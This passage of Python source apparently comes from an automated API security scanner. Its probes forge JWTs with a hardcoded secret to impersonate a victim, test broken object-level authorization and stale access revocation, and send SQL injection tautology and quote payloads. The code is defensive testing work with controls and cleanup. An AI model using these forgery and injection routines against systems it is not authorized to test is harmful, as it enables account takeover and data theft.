    endpoints and matches each path param name to a field on the first item.
    """
    if not params:
        return {}
    for lp in ("/user/repos", "/api/v1/user/repos", "/user/projects",
               "/user/repositories", "/repos", "/projects"):
        try:
            r = sess.get(f"{base}{lp}", headers=_auth_headers(token, auth), timeout=10)
        except Exception:
            continue
        if r.status_code != 200:
            continue
        try:
            items = r.json()
        except Exception:
            continue
        if isinstance(items, dict):
            items = items.get("data") or items.get("items") or items.get("results") or []
        if not (isinstance(items, list) and items and isinstance(items[0], dict)):
            continue
        item = items[0]
        vals: dict = {}
        for prm in params:
            v = _field_for_param(item, prm)
            if v is None:
                break
            vals[prm] = v
        if len(vals) == len(params):
            return vals
    return None


def _field_for_param(item: dict, param: str) -> str | None:
    """Pick the value for a path param from a resource item (owner→owner.login, repo→name…)."""
    p = param.lower()
    if p in ("owner", "username", "user", "org"):
        owner = item.get("owner")
        if isinstance(owner, dict):
            for f in _USERNAME_FIELDS:
                if isinstance(owner.get(f), str):
                    return owner[f]
        for f in _USERNAME_FIELDS:
            if isinstance(item.get(f), str):
                return item[f]
    if p in ("repo", "repository", "name", "slug", "project"):
        for f in ("name", "slug", "full_name"):
            if isinstance(item.get(f), str):
                return item[f].split("/")[-1]
    if p in ("id", "repo_id", "project_id") and item.get("id") is not None:
        return str(item["id"])
    v = item.get(param)
    return str(v) if isinstance(v, (str, int)) else None


def _fill(path: str, values: dict) -> str:
    """Substitute {name} params in a path from `values`."""
    out = path
    for k, v in values.items():
        out = out.replace("{" + k + "}", str(v))
    return out


def access_revocation_probe(model, base_url: str, *, session: requests.Session | None = None,
                            auth: dict | None = None, limit: int = 3) -> list[ProbeFinding]:
    """
    Broken access-revocation — a business-logic flaw OWASP-adjacent to BFLA/BOLA but
    about STALE permission: after an owner REVOKES a user's access to a resource, that
    user must no longer reach it. Apps that cache permissions, or only remove the
    membership row without invalidating access, leak here.

    Two-user control (needs a supplied second identity, token_b): owner A grants user B
    on a resource A owns, then revokes B. The probe fires ONLY when every control step
    succeeds — B gets access on grant (2xx), the revoke is accepted (2xx) — yet B STILL
    reaches the resource after revocation (2xx). Any control failing → silent (can't
    prove it). A correct app returns 403/404 to B after revoke and stays quiet. P1.
    No model calls. Mutating: grants/revokes a membership; both sides are our own test
    identities and the grant is always revoked again.
    """
    sess = session or requests.Session()
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    tok_a = (auth or {}).get("token")
    tok_b = (auth or {}).get("token_b")

    # Grant/revoke pairs: PUT (grant) + DELETE (revoke) on the SAME membership path
    # whose last segment is the member identity ({collaborator}/{username}/...).
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]
    def has(method, path):
        return any(str(e.get("method", "")).upper() == method
                   and str(e.get("path", "")) == path for e in eps)
    pairs = []
    for e in eps:
        if str(e.get("method", "")).upper() != "PUT":
            continue
        path = str(e.get("path", ""))
        m = re.search(r"\{([^}]+)\}$", path.rstrip("/"))
        if not m:
            continue
        segs = [s for s in path.split("/") if s]
        if not any(s.lower() in _MEMBERSHIP_SEGS for s in segs):
            continue
        if has("DELETE", path):
            pairs.append((path, m.group(1)))
    if not pairs:
        _skip(sess, "access-revocation", "no grant/revoke (PUT + DELETE) membership endpoint pair",
              kind="not-applicable")
        return out
    # Only now — the app HAS something to test — is a missing identity a real gap.
    # Self-registration can't make B the grantee of an owner's resource, so this needs
    # two supplied identities.
    if not (tok_a and tok_b):
        _skip(sess, "access-revocation", "needs two supplied identities (--token = the resource "
                                         "owner, --token-b = the user to grant then revoke)",
              needs="token_b")
        return out

    b_user = _whoami(sess, base, tok_b, auth)
    if not b_user:
        _skip(sess, "access-revocation", "could not learn the grantee's username (no recognised "
                                         "'whoami' endpoint such as /user or /me)")
        return out

    seen: set = set()
    for grant_path, member_param in pairs[:limit]:
        # The resource B gains access to: the path up to the membership segment.
        segs = grant_path.split("/")
        cut = next((i for i, s in enumerate(segs) if s.lower() in _MEMBERSHIP_SEGS), None)
        if cut is None:
            continue
        resource_path = "/".join(segs[:cut]) or "/"
        if resource_path in seen or not has("GET", resource_path):
            continue
        seen.add(resource_path)
        res_params = re.findall(r"\{([^}]+)\}", resource_path)
        values = _owned_resource(sess, base, tok_a, auth, res_params)
        if values is None:
            continue
        res_url = base + _fill(resource_path, values)
        grant_url = base + _fill(grant_path, {**values, member_param: b_user})
        ha, hb = _auth_headers(tok_a, auth), _auth_headers(tok_b, auth)

        def code(method, url, headers, **kw):
            try:
                return sess.request(method, url, headers=headers, timeout=15, **kw).status_code
            except Exception:
                return None

        def is2xx(c):
            return isinstance(c, int) and 200 <= c < 300

        # 1) A grants B.  2) B must now reach the resource.  3) A revokes B.
        if not is2xx(code("PUT", grant_url, ha, json={"permission": "read"})):
            continue
        granted_2xx = is2xx(code("GET", res_url, hb))
        revoked = code("DELETE", grant_url, ha)
        if not is2xx(revoked):
            # couldn't revoke → leave the grant cleaned up, then skip (control failed)
            code("DELETE", grant_url, ha)
            continue
        if not granted_2xx:
            continue   # grant never actually gave B access → nothing to prove about revocation
        # 4) After revoke, B must be blocked. Still 2xx == stale access == the bug.
        after = code("GET", res_url, hb)
        if is2xx(after):
            out.append(ProbeFinding(
                probe="access-revocation",
                title=f"Access not revoked on {resource_path}",
                exploited=True, severity="P1",
                evidence=(f"User B kept read access to {resource_path} AFTER user A revoked them "
                          f"(DELETE {grant_path} → {revoked}). The control held: B had no need of "
                          f"access except the grant, the grant returned 2xx, and the revoke returned "
                          f"2xx — yet B still reads the resource (HTTP {after}). Revoking access does "
                          f"not actually remove it (stale/cached permission)."),
                target=resource_path))
            break
    return out


def _jwt_algorithm(model) -> str:
    """Read the JWT algorithm from the model's config, defaulting to HS256."""
    for c in getattr(model, "config", []):
        if isinstance(c, dict) and "algorithm" in str(c.get("key", "")).lower():
            return str(c.get("default") or "HS256")
    return "HS256"


def forge_jwt_probe(model, base_url: str, *, session: requests.Session | None = None) -> ProbeFinding | None:
    """
    Try to forge a JWT with the hardcoded secret and impersonate a victim.

    Returns a ProbeFinding (exploited=True on success), or None when there is no
    hardcoded secret to forge with.
    """
    sess = session or requests.Session()

    secret = None
    for s in getattr(model, "exposed_secrets", []):
        if any(k in str(s.get("key", "")).lower() for k in ("jwt", "secret", "sign", "token", "key")):
            secret = s.get("default")
            break
    if not secret:
        return None

    algorithm = _jwt_algorithm(model)
    if not algorithm.upper().startswith("HS"):
        return ProbeFinding(probe="forge-jwt", title="JWT uses an asymmetric algorithm",
                            exploited=False, severity="P1",
                            evidence=f"algorithm {algorithm} — a config secret is not the signing key",
                            target="auth")

    from core.auth_recipe import derive_auth_recipe, register_body, subject_candidates
    recipe = derive_auth_recipe(model)
    register = recipe["register_path"]
    identity = recipe["identity_path"]
    base = base_url.rstrip("/")
    victim = f"victim_{uuid.uuid4().hex[:8]}@example.com"

    reg_response = None
    try:
        rr = sess.post(f"{base}{register}",
                       json=register_body(recipe, model, victim, password="Str0ngPass!23"),
                       timeout=15)
        try:
            reg_response = rr.json()
        except Exception:
            reg_response = None
    except Exception as exc:  # pragma: no cover - network
        logger.warning("forge_jwt: victim register failed: %s", exc)

    exp = int(time.time()) + 3600
    for sub in subject_candidates(victim, reg_response):
        token = sign_jwt_hs(secret, algorithm, {"sub": sub, "exp": exp})
        if not token:
            continue
        try:
            r = sess.get(f"{base}{identity}", headers={"Authorization": f"Bearer {token}"}, timeout=15)
        except Exception as exc:  # pragma: no cover - network
            logger.warning("forge_jwt: identity call failed: %s", exc)
            continue
        if r.status_code == 200 and victim in r.text:
            return ProbeFinding(
                probe="forge-jwt",
                title="JWT forgery → full account takeover",
                exploited=True, severity="P1",
                evidence=(f"Forged a token for {victim} with the hardcoded secret "
                          f"{str(secret)[:24]!r} (alg {algorithm}); GET {identity} returned 200 with "
                          f"the victim's data — no password needed."),
                target=identity)

    return ProbeFinding(probe="forge-jwt", title="JWT forgery attempt did not succeed",
                        exploited=False, severity="P1",
                        evidence="forged token was rejected (secret/subject/alg did not match)",
                        target=identity)


_SQL_ERRORS = ("sql syntax", "sqlite3", "operationalerror", "sqlalchemy",
               "unrecognized token", "syntax error", "psycopg2", "you have an error in your sql",
               "unterminated", "near \"", "programmingerror")


_ID_KW = ("email", "username", "login", "phone", "mobile", "msisdn", "user")
_SECRET_KW = ("password", "passwd", "pwd", "secret", "pin", "pass")


_RES_SKIP_SEGS = {"api", "rest", "register", "signup", "sign-up", "sign_up", "login",
                  "signin", "sign-in", "session", "sessions", "token", "auth", "authenticate"}


def _resource_key(path: str) -> str | None:
    """
    The singular resource name an API likely wraps a body under, from the endpoint
    path: /api/users -> "user", /users/v1/register -> "user". Skips version/action
    segments. Used to recover from a model that missed a wrapper like {"user":{...}}.
    """
    for seg in reversed([p for p in str(path).strip("/").split("/") if p]):
        s = seg.lower()
        if "{" in seg or ":" in seg or s in _RES_SKIP_SEGS or re.fullmatch(r"v\d+", s):
            continue
        return s[:-1] if s.endswith("s") and len(s) > 1 else s
    return None


def _auth_token(sess, base, recipe, model, identity, password="Secret123!"):
    """
    Register `identity` then log in and return a bearer token (or None).

    The login body is built from the LOGIN endpoint's OWN request fields — not the
    register id field — because an app can register with one identifier (email) and
    log in with another (username). The value reused is whatever the register body
    put in that same field, so the two always match.

    If the modelled register body is rejected (4xx), we retry once with it WRAPPED
    under the resource name (e.g. {"user": {...}}) — recovering on APIs whose wrapper
    the source model didn't capture — and apply the same wrapper to the login body.
    """
    from core.auth_recipe import field_names, nest_body, register_body
    reg_body = register_body(recipe, model, identity, password=password)
    reg_url = f"{base}{recipe['register_path']}"
    wrapper = None
    try:
        rr = sess.post(reg_url, json=reg_body, timeout=15)
    except Exception:
        return None
    if getattr(rr, "status_code", 500) >= 400:
        w = _resource_key(recipe["register_path"])
        if w and not (isinstance(reg_body, dict) and w in reg_body):
            try:
                rr2 = sess.post(reg_url, json={w: reg_body}, timeout=15)
                if getattr(rr2, "status_code", 500) < 400:
                    wrapper = w
            except Exception:
                pass

    login_fields: list[str] = []
    for e in getattr(model, "endpoints", []):
        if (isinstance(e, dict) and str(e.get("path", "")) == recipe["login_path"]
                and str(e.get("method", "")).upper() == "POST"):
            login_fields = field_names(e.get("request_fields"))
            break
    id_field = next((f for f in login_fields if any(k in f.lower() for k in _ID_KW)), recipe["id_field"])
    sec_field = next((f for f in login_fields if any(k in f.lower() for k in _SECRET_KW)), recipe["secret_field"])
    id_value = reg_body.get(id_field, identity)
    login_url = f"{base}{recipe['login_path']}"

    def _wrap(bdy):
        return {wrapper: bdy} if (wrapper and not (isinstance(bdy, dict) and wrapper in bdy)) else bdy

    tok = None
    # 1) JSON login (FastAPI/Flask-RESTX/connexion style). nest_body wraps dotted
    #    fields, and _wrap applies the resource wrapper recovered at registration,
    #    so this works on APIs that wrap the body (e.g. {"user":{...}}).
    try:
        lr = sess.post(login_url, json=_wrap(nest_body({id_field: id_value, sec_field: password})), timeout=15)
        tok = _extract_token(lr, recipe)
    except Exception:
        tok = None
    # 2) OAuth2 form login (OAuth2PasswordRequestForm): x-www-form-urlencoded with the
    #    literal fields `username`/`password`. Common on FastAPI apps — without this
    #    QAX can't get a token there and every auth'd probe silently skips.
    if not tok:
        try:
            lr = sess.post(login_url, data={"username": id_value, "password": password}, timeout=15)
            tok = _extract_token(lr, recipe)
        except Exception:
            tok = None
    # Record the user we just created (with its own token) so the scan can delete it.
    if tok:
        _record_created(sess, _collection_of(recipe["register_path"]), reg_body,
                        {"Authorization": f"Bearer {tok}"})
    return tok


def _extract_token(response, recipe):
    """Pull a bearer token out of a login response (recipe field, then any token-ish
    key), searching nested objects too so wrapped responses like {"user":{"token"}} work."""
    try:
        if response.status_code >= 400:
            return None
        data = response.json()
    except Exception:
        return None
    return _search_token(data, recipe.get("token_field", "access_token"))


def _search_token(data, token_field, _depth: int = 0):
    """Recursively find a bearer token: the exact field first, then any token-ish key."""
    if _depth > 4 or not isinstance(data, dict):
        return None
    v = data.get(token_field)
    if isinstance(v, str) and v:
        return v
    for k, val in data.items():
        if isinstance(val, str) and val and any(t in k.lower() for t in ("token", "jwt", "access", "auth")):
            return val
    for val in data.values():
        if isinstance(val, dict):
            r = _search_token(val, token_field, _depth + 1)
            if r:
                return r
    return None


def _auth_headers(token, auth: dict | None = None) -> dict:
    """Build the auth header for a token, honouring a supplied header name/scheme."""
    if not token:
        return {}
    auth = auth or {}
    header = auth.get("header") or "Authorization"
    scheme = auth.get("scheme", "Bearer") if "scheme" in auth else "Bearer"
    value = f"{scheme} {token}".strip() if scheme else str(token)
    return {header: value}


# Trailing path segments that denote an action, not the resource collection.
_ACTION_SEGS = ("register", "signup", "sign-up", "sign_up", "create", "new", "add")


def _collection_of(path: str) -> str:
    """The resource collection a create endpoint writes into (strip a trailing action)."""
    segs = str(path).rstrip("/").split("/")
    if segs and segs[-1].lower() in _ACTION_SEGS:
        return "/".join(segs[:-1]) or "/"
    return str(path).rstrip("/")


def _record_created(sess, collection: str, body: dict, headers: dict) -> None:
    """
    Note a disposable record QAX just created, so the scan can clean it up afterwards.
    No-op unless the caller (ProbeService) opened a registry on the session, so probes
    run in isolation (and tests) write nothing extra. Never raises.
    """
    try:
        reg = getattr(sess, "_qax_created", None)
        if reg is None:
            return
        entry = {"collection": collection, "body": dict(body or {}), "headers": dict(headers or {})}
        same = next((a for a in reg if a.get("collection") == collection and a.get("body") == entry["body"]), None)
        if same is not None:          # already captured at the session boundary (track_writes)
            same.update(entry)
            same.pop("auto", None)
            return
        reg.append(entry)
    except Exception:
        pass


def track_writes(sess):
    """
    Data-state honesty at the boundary (PLAN_TO_V1 D9): many probes POST payloads into
    create endpoints without registering what they created, so "LEFT ON THE TARGET" under-reported.
    This wraps the session so EVERY write the server accepted as a creation — HTTP 201, or a 2xx whose
    JSON body carries an id — is registered (probes that also call _record_created are de-duplicated).
    Logins, lookups, GraphQL and other non-creating 2xx answers are not records. Idempotent; never raises.
    """
    if getattr(sess, "_qax_tracking", False) or getattr(sess, "_qax_created", None) is None:
        return sess
    from urllib.parse import urlparse
    real = sess.request

    def _request(method, url, *a, **kw):
        r = real(method, url, *a, **kw)
        try:
            m = str(method or "").upper()
            code = getattr(r, "status_code", 0)
            if m in ("POST", "PUT", "PATCH") and 200 <= code < 300:
                created = code == 201
                if not created:
                    try:
                        j = r.json()
                        created = isinstance(j, dict) and any(k in j for k in ("id", "uuid", "_id"))
                    except Exception:
                        created = False
                if created:
                    body = kw.get("json") if isinstance(kw.get("json"), dict) else \
                        (kw.get("data") if isinstance(kw.get("data"), dict) else {})
                    coll = _collection_of(urlparse(str(url)).path)
                    reg = sess._qax_created
                    if not any(x.get("collection") == coll and x.get("body") == body for x in reg):
                        reg.append({"collection": coll, "body": dict(body), "headers": dict(kw.get("headers") or {}),
                                    "auto": True})
        except Exception:
            pass
        return r

    sess.request = _request
    sess._qax_tracking = True
    return sess


_ID_FIELDS = ("username", "email", "title", "name", "id", "key", "slug")


def _artifact_key(body: dict):
    """A short human identifier for a created record (never a secret: only id-like fields)."""
    for f in _ID_FIELDS:
        for k, v in (body or {}).items():
            if str(k).lower() == f and isinstance(v, (str, int)) and str(v):
                return str(v)[:60]
    for k, v in (body or {}).items():
        if any(h in str(k).lower() for h in _ID_FIELDS) and isinstance(v, (str, int)) and str(v):
            return str(v)[:60]
    return None


def _left(art: dict, why: str) -> dict:
    """One 'left on the target' entry: where, which record, and why it stayed. No headers/bodies."""
    return {"collection": str(art.get("collection", "")), "key": _artifact_key(art.get("body", {})),
            "why": why}


def leftover_artifacts(session, default_why: str = "not cleaned") -> list[dict]:
    """
    The records QAX created on the target and did NOT remove ("list what
    tests created and what remains, with exact locations"). After cleanup_artifacts ran
    this is its precise list; if cleanup never ran, every registered record is listed with
    `default_why`. Never raises.
    """
    try:
        left = getattr(session, "_qax_leftover", None)
        if isinstance(left, list):
            return list(left)
        reg = getattr(session, "_qax_created", None) or []
        return [_left(a, default_why) for a in reg]
    except Exception:
        return []


def cleanup_artifacts(model, base_url: str, session) -> int:
    """
    Best-effort DELETE of the disposable records QAX created this scan. Deletes ONLY
    keys QAX itself recorded, matched to a DELETE endpoint on the same collection and
    authorized with the creator's own token. Never deletes anything it did not create,
    and never raises. Returns the count actually removed; whatever could NOT be removed
    (and why) is left on `session._qax_leftover` for leftover_artifacts().
    """
    reg = getattr(session, "_qax_created", None)
    if not reg:
        return 0
    base = base_url.rstrip("/")
    left: list[dict] = []
    try:
        session._qax_leftover = left
    except Exception:
        pass
    dels = []
    for e in getattr(model, "endpoints", []):
        if isinstance(e, dict) and str(e.get("method", "")).upper() == "DELETE":
            p = str(e.get("path", ""))
            m = re.search(r"\{([^}]+)\}", p)
            if m:
                dels.append((p, m.group(1), p[:m.start()].rstrip("/")))
    if not dels:
        left.extend(_left(a, "the API has no DELETE endpoint for it") for a in reg)
        return 0
    cleaned = 0
    for art in reg:
        match = next((d for d in dels if d[2] == art.get("collection", "")), None)
        if not match:
            left.append(_left(art, "no DELETE endpoint for this collection"))
            continue
        path, param, _ = match
        body = art.get("body", {})
        key = body.get(param)
        if key is None:
            key = next((v for k, v in body.items() if k.lower() == param.lower()), None)
        if key is None:
            key = next((body[f] for f in body if any(k in f.lower()
                        for k in ("username", "email", "title", "name", "id", "key", "slug"))), None)
        if key is None:
            left.append(_left(art, "could not work out its key to delete it"))
            continue
        url = f"{base}{path.replace('{' + param + '}', str(key))}"
        try:
            r = session.delete(url, headers=art.get("headers", {}), timeout=15)
            code = getattr(r, "status_code", 500)
            if code < 300:
                cleaned += 1
            else:
                left.append(_left(art, f"delete was refused (HTTP {code})"))
        except Exception:
            left.append(_left(art, "the delete request failed"))
    return cleaned


def _resolve_token(sess, base, recipe, model, identity, *, auth: dict | None = None, slot: str = "primary"):
    """
    Get a bearer token for a probe. Prefer a token SUPPLIED by the caller (so apps
    that issue tokens outside a register/login flow — external IdP, offline-signed
    JWT, API key — can still be exercised); otherwise self-register + login.
    `slot` picks which supplied token: 'primary' (user A) or 'secondary' (user B).
    """
    auth = auth or {}
    if slot == "secondary" and auth.get("token_b"):
        return auth["token_b"]
    if slot == "primary" and auth.get("token"):
        return auth["token"]
    # NB: each call self-registers a FRESH user on purpose — do not cache/share the
    # token across probes. BOLA's two-user control needs genuinely distinct users, and
    # sharing one "primary" user across probes defeats it (B would read its own object).
    return _auth_token(sess, base, recipe, model, identity)


def bola_probe(model, base_url: str, *, session: requests.Session | None = None,
               auth: dict | None = None, limit: int = 4) -> list[ProbeFinding]:
    """
    Broken Object-Level Authorization via a TWO-USER control experiment.

    User A creates an object carrying a unique secret marker; user B then reads it
    by its key. If B's read returns 2xx WITH A's marker, there is no ownership check
    — B read A's private object. A reading its own object first is the control that
    proves the object and endpoint are valid (so a failure to create isn't misread).
    When the app is safe, B gets a 404 and nothing is flagged.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names, nest_body
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]

    # Pair each auth-required "read by key" GET with the POST that creates into the
    # same collection, and find which body field is the object's key.
    pairs = []
    for ge in eps:
        if str(ge.get("method", "")).upper() != "GET" or not ge.get("auth_required"):
            continue
        gp = str(ge.get("path", ""))
        m = re.search(r"\{([^}]+)\}", gp)
        if not m:
            continue
        param = m.group(1)
        prefix = gp[:m.start()].rstrip("/")
        post = next((e for e in eps if str(e.get("method", "")).upper() == "POST"
                     and str(e.get("path", "")).rstrip("/") == prefix
                     and field_names(e.get("request_fields"))), None)
        if not post:
            continue
        pf = field_names(post.get("request_fields"))
        key_field = next((f for f in pf if f.lower() == param.lower()), None) \
            or next((f for f in pf if any(k in f.lower() for k in ("title", "name", "id", "slug", "key"))), None)
        if key_field:
            pairs.append((post, ge, prefix, param, key_field, pf))
    if not pairs:
        _no_candidates(sess, "bola", "create endpoint paired with a read-by-key GET")
        return out

    ta = _resolve_token(sess, base, recipe, model, f"bola_a_{uuid.uuid4().hex[:8]}@example.com",
                        auth=auth, slot="primary")
    tb = _resolve_token(sess, base, recipe, model, f"bola_b_{uuid.uuid4().hex[:8]}@example.com",
                        auth=auth, slot="secondary")
    if not ta or not tb:
        _skip(sess, "bola", "needs two distinct users — self-registration failed and "
                            "--token/--token-b were not both supplied", needs="token_b")
        return out

    _CONTENT_KW = ("secret", "content", "body", "data", "value", "text", "note", "description", "payload")
    attempted = created_ok = readable = compared = 0
    for post, ge, prefix, param, key_field, pf in pairs[:limit]:
        key = f"qaxbola{uuid.uuid4().hex[:10]}"
        marker = f"qaxmarker{uuid.uuid4().hex[:12]}"
        body: dict = {}
        for f in pf:
            lf = f.lower()
            if f == key_field:
                body[f] = key
            elif any(k in lf for k in _CONTENT_KW):
                body[f] = marker
            elif any(k in lf for k in _SECRET_KW):
                body[f] = "Secret123!"
            elif any(k in lf for k in ("age", "count", "number", "qty")):
                body[f] = 1
            else:
                body[f] = "test"
        if marker not in str(body):  # make sure a detectable secret is present
            placed = next((f for f in pf if f != key_field), None)
            if not placed:
                continue  # key-only resource: nothing private to leak, can't prove
            body[placed] = marker
        attempted += 1

        auth_a = _auth_headers(ta, auth)
        auth_b = _auth_headers(tb, auth)
        try:
            cr = sess.post(f"{base}{prefix}", json=nest_body(body), headers=auth_a, timeout=15)
            if cr.status_code >= 400:
                continue
            created_ok += 1
            _record_created(sess, prefix, body, auth_a)
            read_path = f"{base}{str(ge['path']).replace('{' + param + '}', key)}"
            ar = sess.get(read_path, headers=auth_a, timeout=15)
            if ar.status_code >= 400:  # control: A must be able to read its own object
                continue
            readable += 1
            br = sess.get(read_path, headers=auth_b, timeout=15)
        except Exception:
            continue
        compared += 1
        if br.status_code < 300 and marker in (br.text or ""):
            out.append(ProbeFinding(
                probe="bola", title=f"Broken object-level authorization in GET {ge['path']}",
                exploited=True, severity="P1",
                evidence=(f"User B read user A's object (key '{key}') via {ge['path']}: B's request "
                          f"returned {br.status_code} containing A's private content. The endpoint "
                          f"has no ownership check — any authenticated user can read any object."),
                target=str(ge["path"])))
    if not out:
        if not attempted:
            _skip(sess, "bola", "every candidate resource has only a key field — there is no private content "
                                "for a second user to leak", kind="not-applicable")
        elif not created_ok:
            _skip(sess, "bola", f"could not exercise it: user A's create request was rejected or failed on "
                                f"all {attempted} candidate endpoint(s), so there was no object to attack",
                  needs="valid-body")
        elif not readable:
            _skip(sess, "bola", "user A created objects but could not read its own back (the control), so "
                                "user B's access could not be compared")
    return out
def sqli_probe(model, base_url: str, *, session: requests.Session | None = None,
               auth: dict | None = None, limit: int = 5) -> list[ProbeFinding]:
    """
    Error-based SQL injection with a CONTROL: a benign value vs the same value with
    a single quote. If the quote breaks the query (5xx or a SQL error in the body)
    while the benign value is fine, the input reaches a raw query — injection.
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []

    cands = [e for e in getattr(model, "endpoints", [])
             if isinstance(e, dict) and str(e.get("method", "")).upper() == "GET"
             and "{" in str(e.get("path", ""))]
    if not cands:
        _no_candidates(sess, "sqli", "GET endpoint with a path parameter")
        return out
    token = None
    if any(e.get("auth_required") for e in cands):
        token = _resolve_token(sess, base, recipe, model, f"sqli_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
        _need_token(sess, "sqli", token)
    reached = [0]

    for e in cands[:limit]:
        path = str(e.get("path", ""))
        m = re.search(r"\{([^}]+)\}", path)
        if not m:
            continue
        param = m.group(1)
        headers = _auth_headers(token, auth) if e.get("auth_required") else {}

        def send(value, _p=path, _pr=param, _h=headers):
            try:
                r = sess.get(f"{base}{_p.replace('{' + _pr + '}', str(value))}", headers=_h, timeout=15)
                reached[0] += 1
                return r.status_code, r.text
            except Exception:
                return None, ""

        f = _detect_injection(send, method=str(e.get("method", "GET")), path=path,
                              where=f"path param '{param}'")
        if f:
            out.append(f)
    if not out and not reached[0]:
        _unreached(sess, "sqli", len(cands[:limit]))
    return out


# Payloads that break out of a string literal in either quote style, and boolean
# tautologies for a differential (row-count) proof (QA knowledge base sec 1.6).
_QUOTES = ('"', "'")


def _detect_injection(send, *, method: str, path: str, where: str) -> ProbeFinding | None:
    """
    Confirm SQL injection from a `send(value) -> (status, body)` closure, with a
    control. Two independent proofs, either is enough:
      • error-based: a quote (either style) yields a SQL error in the body → P1.
      • boolean-based: a TRUE tautology returns far more data than both the benign
        value and a matched FALSE tautology → the WHERE clause was bypassed → P1.
    A 5xx with no SQL error text is reported as P3 robustness only (not proof —
    don't cry wolf). Benign already 5xx = no clean signal.
    """
    def ask(value):
        # A 5xx can reset a keep-alive connection, so the FOLLOWING request on a
        # shared session errors (status None). Retry once to re-establish it.
        s, b = send(value)
        if s is None:
            s, b = send(value)
        return s, b

    sb, bb = ask("qaxprobe1")
    if sb is None or sb >= 500:
        return None
    nben = len(bb or "")
    p3: ProbeFinding | None = None
    for q in _QUOTES:
        # Boolean-differential FIRST (both payloads are valid SQL → 200, no 5xx to
        # reset the connection): a TRUE tautology returning far more data than a
        # matched FALSE one and the benign value = the WHERE clause was bypassed.
        st_t, bt_t = ask(f"qaxprobe1{q} OR {q}1{q}={q}1")
        st_f, bt_f = ask(f"qaxprobe1{q} OR {q}1{q}={q}2")
        if (st_t == 200 and st_f == 200 and bt_t is not None and bt_f is not None
                and len(bt_t) > max(len(bt_f), nben) * 2 + 20):
            return ProbeFinding(
                probe="sqli", title=f"SQL injection in {method} {path} ({where})",
                exploited=True, severity="P1",
                evidence=(f"Boolean injection in {where}: a TRUE tautology returned far more data "
                          f"({len(bt_t)}B) than a matched FALSE one ({len(bt_f)}B) or the benign value "
                          f"({nben}B) — the WHERE clause was bypassed."),
                target=path)
        # Status-differential (auth-bypass / single-record style): the TRUE tautology
        # changes the OUTCOME status to a success while the matched FALSE one stays
        # identical to the benign value. FALSE==benign is the control — it proves the
        # status flip tracks the injected boolean, not just "any extra input".
        if (st_t is not None and st_f is not None and st_f == sb
                and st_t != sb and 200 <= st_t < 400 and st_f >= 400):
            return ProbeFinding(
                probe="sqli", title=f"SQL injection in {method} {path} ({where})",
                exploited=True, severity="P1",
                evidence=(f"Boolean injection in {where}: a TRUE tautology returned HTTP {st_t} "
                          f"(success) while the benign value and a matched FALSE tautology both "
                          f"returned {sb} — the injected condition is evaluated by the database "
                          f"(auth/record bypass)."),
                target=path)
        # Then error-based: a quote that yields a SQL error = confirmed (P1); a bare
        # 5xx = robustness lead only (P3 — not proof, don't cry wolf).
        st, bt = ask("qaxprobe1" + q)
        if st is not None and st >= 500:
            if any(s in (bt or "").lower() for s in _SQL_ERRORS):
                return ProbeFinding(
                    probe="sqli", title=f"SQL injection in {method} {path} ({where})",
                    exploited=True, severity="P1",
                    evidence=(f"A {q} in {where} produced a SQL error (benign → {sb}, payload → {st}). "
                              f"The input reaches a raw, unparameterized query."),
                    target=path)
            p3 = p3 or ProbeFinding(
                probe="input-robustness",
                title=f"Unhandled 500 on injection-style input in {method} {path} ({where})",
                exploited=True, severity="P3",
                evidence=(f"A {q} in {where} caused HTTP {st} (benign → {sb}) with NO SQL error text. "
                          f"Likely injection or input-handling; NOT confirmed — reported low and separately."),
                target=path)
    return p3


_DATE_KW = ("time", "date", "_at", "timestamp", "expir", "start", "end", "dob",
            "created", "updated", "scheduled", "deadline", "dateofbirth")


def _benign_body(fields: list[str]) -> dict:
    """A type-plausible benign body (by field-name heuristic) that should pass validation."""
    body: dict = {}
    for f in fields:
        lf = f.lower()
        if "email" in lf:
            body[f] = "qaxprobe1@example.com"
        elif any(k in lf for k in _DATE_KW):
            body[f] = "2020-01-01T00:00:00"          # a valid ISO datetime baseline
        elif any(k in lf for k in ("age", "count", "number", "qty", "amount", "price", "id")):
            body[f] = 1
        elif any(k in lf for k in ("is_", "enabled", "active", "admin", "approved")):
            body[f] = False
        else:
            body[f] = "qaxprobe1"
    return body


def _stringy(field: str, value) -> bool:
    """A field worth quote-fuzzing for SQLi: a plain text string (not email/date)."""
    if not isinstance(value, str):
        return False
    lf = field.lower()
    return "email" not in lf and not any(k in lf for k in _DATE_KW)


# Query params that servers commonly parse as ints without a guard (int(request.args...)).
_COMMON_NUMERIC_PARAMS = ("page", "per_page", "page_size", "limit", "offset", "skip", "size")


def _numeric_param(name: str) -> bool:
    n = name.lower()
    return any(k in n for k in ("page", "limit", "offset", "count", "qty", "amount",
                                "num", "size", "skip", "top"))


def malformed_input_probe(model, base_url: str, *, session: requests.Session | None = None,
                          auth: dict | None = None) -> list[ProbeFinding]:
    """
    Unhandled-500 / debug disclosure from MALFORMED (type-violating) input — the bug
    class a messy app ships: a value the server parses without a try/except
    (datetime.fromisoformat, int(), json.loads, UUID…). Posts a VALID baseline body,
    then sets one field at a time to garbage and watches for a 5xx:
      • a 5xx whose body shows an interactive debugger → P1 (debug mode on / RCE risk).
      • a 5xx whose body shows a stack trace → P2 (source/stack disclosure).
      • a plain 5xx → P2 (input not validated — unhandled server error).
    Control: the baseline must be < 500. POST/PUT/PATCH only (never DELETE).
    """
    sess = session or requests.Session()
    from core.auth_recipe import derive_auth_recipe, field_names
    recipe = derive_auth_recipe(model)
    base = base_url.rstrip("/")
    out: list[ProbeFinding] = []
    eps = [e for e in getattr(model, "endpoints", []) if isinstance(e, dict)]
    _tok = {"v": None}

    def headers_for(e):
        if not e.get("auth_required"):
            return {}
        if _tok["v"] is None:
            _tok["v"] = _resolve_token(sess, base, recipe, model,
                                       f"mal_{uuid.uuid4().hex[:8]}@example.com", auth=auth)
            _need_token(sess, "malformed-input", _tok["v"])
        return _auth_headers(_tok["v"], auth)

    w_eps = [x for x in eps if str(x.get("method", "")).upper() in ("POST", "PUT", "PATCH")
